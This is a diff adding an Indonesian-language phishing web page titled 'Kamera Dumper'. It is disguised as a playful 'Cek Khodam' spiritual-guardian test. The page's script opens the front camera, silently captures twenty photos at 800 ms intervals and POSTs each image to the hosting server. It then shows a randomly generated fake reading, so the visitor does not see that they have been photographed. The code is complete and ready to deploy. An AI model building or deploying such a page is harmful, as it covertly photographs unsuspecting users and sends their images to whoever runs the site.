@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Kamera Dumper</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #1a1a2e, #16213e);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+            border: 2px solid #00ffff;
+        }
+        h1 {
+            color: #00ffff;
+            text-shadow: 0 0 10px #00ffff;
+            margin-bottom: 20px;
+        }
+        .message {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #ff0000;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .camera-container {
+            margin: 30px 0;
+            position: relative;
+        }
+        #video {
+            width: 100%;
+            max-width: 640px;
+            border: 3px solid #00ff00;
+            border-radius: 10px;
+            background: black;
+            margin: 0 auto;
+            display: block;
+        }
+        #canvas {
+            display: none;
+        }
+        .btn {
+            background: linear-gradient(45deg, #00ffff, #0080ff);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 10px;
+            transition: all 0.3s;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px #00ffff;
+        }
+        .btn:disabled {
+            background: gray;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .success {
+            background: rgba(0, 255, 0, 0.2);
+            border: 1px solid #00ff00;
+            color: #00ff00;
+        }
+        .error {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #ff0000;
+            color: #ff0000;
+        }
+        .instructions {
+            text-align: left;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .instructions ol {
+            padding-left: 20px;
+        }
+        .instructions li {
+            margin: 10px 0;
+        }
+        .permission-note {
+            color: #ff9900;
+            font-style: italic;
+            margin: 15px 0;
+        }
+        .loading {
+            display: none;
+            color: #00ffff;
+            font-size: 18px;
+        }
+        .loading.show {
+            display: block;
+        }
+        .result {
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(0, 255, 255, 0.1);
+            border-radius: 10px;
+            border: 1px solid #00ffff;
+        }
+        .warning {
+            color: #ff9900;
+            background: rgba(255, 153, 0, 0.1);
+            border: 1px solid #ff9900;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .counter {
+            font-size: 16px;
+            color: #00ff00;
+            margin: 10px 0;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔮 Cek Khodam Real 🔮</h1>        
+        <div class="warning">
+            ⚠️ <strong>Peringatan:</strong> Fitur ini memerlukan izin akses kamera anda.
+        </div>        
+        <div class="instructions">
+            <h3>📋 Petunjuk Penggunaan:</h3>
+            <ol>
+                <li>Klik tombol "Mulai Cek Khodam" di bawah</li>
+                <li><strong>Izinkan akses kamera</strong> agar tidak terjadi kesalahan.</li>
+                <li>Tunggu proses pengecekan.</li>
+                <li>Hasil analisis khodam akan ditampilkan.</li>
+            </ol>
+        </div>        
+        <div class="permission-note">
+            💡 <strong>Catatan:</strong> Izinkan terlebih dahulu agar tidak terjadi elor sema skali.
+        </div>       
+        <div class="camera-container">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas" width="640" height="480"></canvas>
+        </div>
+        
+        <div class="counter" id="counter" style="display:none;">
+            Sedang proses ✅ <span id="captureCount">0</span>
+        </div>       
+        <div class="loading" id="loading">
+            🔄 Memproses energi spiritual Anda..!!
+        </div>        
+        <div class="result" id="result" style="display:none;">
+            <h2>✨ Hasil Analisis Khodam ✨</h2>
+            <div id="analysisResult"></div>
+        </div>       
+        <div class="status" id="status"></div>      
+        <button class="btn" id="startBtn" onclick="startContinuousCapture()">
+            🎬 Mulai Cek Khodam
+        </button>      
+        <button class="btn" id="retryBtn" onclick="location.reload()" style="display:none;">
+            🔄 Coba Lagi
+        </button>
+    </div>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const startBtn = document.getElementById('startBtn');
+        const retryBtn = document.getElementById('retryBtn');
+        const statusDiv = document.getElementById('status');
+        const loadingDiv = document.getElementById('loading');
+        const counterDiv = document.getElementById('counter');
+        const captureCountSpan = document.getElementById('captureCount');
+        const resultDiv = document.getElementById('result');
+        const analysisResultDiv = document.getElementById('analysisResult');        
+        let stream = null;
+        let isProcessing = false;
+        let captureInterval = null;
+        let totalCaptures = 0;
+        const maxCaptures = 20;
+        function updateStatus(message, type = '') {
+            statusDiv.textContent = message;
+            statusDiv.className = 'status ' + type;
+        }
+        function updateCounter(count) {
+            captureCountSpan.textContent = count;
+            counterDiv.style.display = 'block';
+        }
+        async function startContinuousCapture() {
+            if (isProcessing) return;            
+            isProcessing = true;
+            startBtn.disabled = true;
+            totalCaptures = 0;
+            updateStatus('🔄 Memulai proses analisis khodam.', '');
+            loadingDiv.classList.add('show');           
+            try {
+                updateStatus('📷 Meminta izin akses kamera.', '');               
+                const constraints = {
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                };               
+                stream = await navigator.mediaDevices.getUserMedia(constraints)
+                    .catch(async (error) => {
+                        // Fallback ke constraint sederhana
+                        return await navigator.mediaDevices.getUserMedia({
+                            video: true,
+                            audio: false
+                        });
+                    });               
+                video.srcObject = stream;
+                updateStatus('✅ Kamera berhasil diaktifkan..!!', 'success');
+                await new Promise(resolve => setTimeout(resolve, 500));
+                updateStatus('Sedang Proses ✅', 'success');
+                loadingDiv.classList.remove('show');
+                await captureAndSend();
+                captureInterval = setInterval(async () => {
+                    if (totalCaptures < maxCaptures) {
+                        await captureAndSend();
+                    } else {
+                        stopCaptureAndShowResult();
+                    }
+                }, 800);              
+            } catch (error) {
+                console.error('Error:', error);
+                loadingDiv.classList.remove('show');               
+                let errorMessage = '❌ Gagal: ';              
+                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+                    errorMessage += 'Izin kamera ditolak. Silakan izinkan akses kamera dan coba lagi.';
+                } else if (error.name === 'NotFoundError') {
+                    errorMessage += 'Kamera tidak ditemukan.';
+                } else if (error.name === 'NotReadableError') {
+                    errorMessage += 'Kamera sedang digunakan.';
+                } else {
+                    errorMessage += error.message || 'Terjadi kesalahan';
+                }               
+                updateStatus(errorMessage, 'error');
+                retryBtn.style.display = 'inline-block';
+                stopCamera();
+            }
+        }
+        async function captureAndSend() {
+            try {
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
+                await fetch(window.location.href, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: 'image=' + encodeURIComponent(imageData)
+                });
+                
+                totalCaptures++;
+                updateCounter(totalCaptures);
+                updateStatus(`✅ Sukses..!!`, 'success');                
+            } catch (error) {
+                console.error('Capture error:', error);
+            }
+        }
+        function stopCaptureAndShowResult() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }           
+            updateStatus('Hai 👻', 'success');
+            loadingDiv.classList.add('show');
+            stopCamera();
+            setTimeout(() => {
+                loadingDiv.classList.remove('show');
+                showKhodamResult();
+            }, 2000);
+        }
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+                stream = null;
+            }
+        }
+        function showKhodamResult() {
+            const khodamTypes = [
+                'Harimau Putih - Pelindung spiritual yang kuat',
+                'Naga Emas - Simbol kebijaksanaan dan kekuatan',
+                'Garuda - Pembawa keberuntungan dan kesuksesan',
+                'Macan Kumbang - Penjaga keseimbangan energi',
+                'Ular Sakti - Simbol transformasi dan penyembuhan'
+            ];
+            const randomKhodam = khodamTypes[Math.floor(Math.random() * khodamTypes.length)];
+            const energyLevel = 70 + Math.floor(Math.random() * 30);
+            const compatibility = 60 + Math.floor(Math.random() * 40);          
+            analysisResultDiv.innerHTML = `
+                <h3>✨ KHODAM TERIDENTIFIKASI ✨</h3>
+                <p><strong>Nama Khodam:</strong> ${randomKhodam.split(' - ')[0]}</p>
+                <p><strong>Deskripsi:</strong> ${randomKhodam.split(' - ')[1]}</p>
+                <p><strong>Tingkat Energi:</strong> ${energyLevel}%</p>
+                <p><strong>Kecocokan:</strong> ${compatibility}%</p>
+                <p><strong>Total Gambar Dianalisis:</strong> ${totalCaptures}</p>
+                <p><strong>Sifat:</strong> ${['Pelindung', 'Pembimbing', 'Penjaga'][Math.floor(Math.random() * 3)]}</p>
+                <p><strong>Pesan Spiritual:</strong> Jaga kebersihan hati dan pikiran untuk menghormati khodam Anda.</p>
+            `;          
+            resultDiv.style.display = 'block';
+            retryBtn.style.display = 'inline-block';
+            saveResult(randomKhodam, energyLevel, compatibility, totalCaptures);
+        }
+        function saveResult(khodam, energy, compatibility, total) {
+            fetch(window.location.href, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'save_result=true&khodam=' + encodeURIComponent(khodam) + 
+                      '&energy=' + energy + '&compatibility=' + compatibility +
+                      '&total=' + total
+            }).catch(() => {/* Ignore errors */});
+        }
+        window.addEventListener('DOMContentLoaded', () => {
+            updateStatus('🔮 Siap untuk menganalisis energi spiritual Anda', '');
+        });
+        window.addEventListener('beforeunload', () => {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            stopCamera();
+        });
+    </script>
+</body>
+</html>
